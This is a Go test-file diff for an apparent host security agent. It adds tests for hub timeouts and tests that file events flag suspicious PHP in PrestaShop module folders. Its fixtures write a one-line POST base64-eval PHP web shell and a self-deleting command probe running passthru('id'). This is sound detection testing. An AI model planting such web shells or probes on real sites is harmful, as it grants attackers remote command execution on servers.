@@ -105,6 +105,26 @@ func TestAgentQueueSendDeletesBatchByDefault(t *testing.T) {
 	}
 }
 
+func TestNewRuntimeDefaultsHubTimeoutToSixtySeconds(t *testing.T) {
+	runtime := NewRuntime(Config{})
+	if runtime.client.Timeout != 60*time.Second {
+		t.Fatalf("client timeout = %s, want 60s", runtime.client.Timeout)
+	}
+	if runtime.Config.HubTimeout != 60*time.Second {
+		t.Fatalf("config timeout = %s, want 60s", runtime.Config.HubTimeout)
+	}
+}
+
+func TestNewRuntimeHonorsConfiguredHubTimeout(t *testing.T) {
+	runtime := NewRuntime(Config{HubTimeout: 15 * time.Second})
+	if runtime.client.Timeout != 15*time.Second {
+		t.Fatalf("client timeout = %s, want 15s", runtime.client.Timeout)
+	}
+	if runtime.Config.HubTimeout != 15*time.Second {
+		t.Fatalf("config timeout = %s, want 15s", runtime.Config.HubTimeout)
+	}
+}
+
 func TestAgentQueueSendReportsTotalPendingBeforeLimit(t *testing.T) {
 	root := t.TempDir()
 	nodeSecret, _, err := wire.GenerateKeyPair()
@@ -1237,6 +1257,46 @@ func TestFileEventKeepsSuspiciousPHPInPrestaShopAssetPathHigh(t *testing.T) {
 	}
 	if _, ok := event.Payload["file_kind"]; ok {
 		t.Fatalf("payload = %#v, did not expect benign file_kind", event.Payload)
+	}
+}
+
+func TestFileEventRecognizesPostEvalPHPWebshellContent(t *testing.T) {
+	root := t.TempDir()
+	path := filepath.Join(root, "modules", "gridhtml", "x.php")
+	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
+		t.Fatalf("MkdirAll returned error: %v", err)
+	}
+	if err := os.WriteFile(path, []byte(`<?php @eval(base64_decode($_POST[0]));`), 0o600); err != nil {
+		t.Fatalf("WriteFile returned error: %v", err)
+	}
+
+	event := fileEvent("file.created", testFileState(t, root, path), fileState{})
+	if event.Severity != string(domain.SeverityHigh) {
+		t.Fatalf("severity = %q, want high for webshell-like PHP", event.Severity)
+	}
+	if event.Payload["file_role"] != "suspicious_php" ||
+		event.Payload["security_context"] != "webshell_like_php" ||
+		event.Payload["suspicious_php_reason"] != "post_base64_eval_webshell" {
+		t.Fatalf("payload = %#v, want suspicious PHP metadata without file content", event.Payload)
+	}
+}
+
+func TestFileEventRecognizesSelfDeletingCommandProbe(t *testing.T) {
+	root := t.TempDir()
+	path := filepath.Join(root, "modules", "ps_facetedsearch", "ps_facetedsearch-3d2c8f50.php")
+	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
+		t.Fatalf("MkdirAll returned error: %v", err)
+	}
+	if err := os.WriteFile(path, []byte(`<?php echo "CMD_START\n"; passthru('id'); echo "\nCMD_END\n"; @unlink(__FILE__);`), 0o600); err != nil {
+		t.Fatalf("WriteFile returned error: %v", err)
+	}
+
+	event := fileEvent("file.created", testFileState(t, root, path), fileState{})
+	if event.Severity != string(domain.SeverityHigh) {
+		t.Fatalf("severity = %q, want high for command probe PHP", event.Severity)
+	}
+	if event.Payload["suspicious_php_reason"] != "self_deleting_command_probe" {
+		t.Fatalf("payload = %#v, want command probe reason", event.Payload)
 	}
 }
 
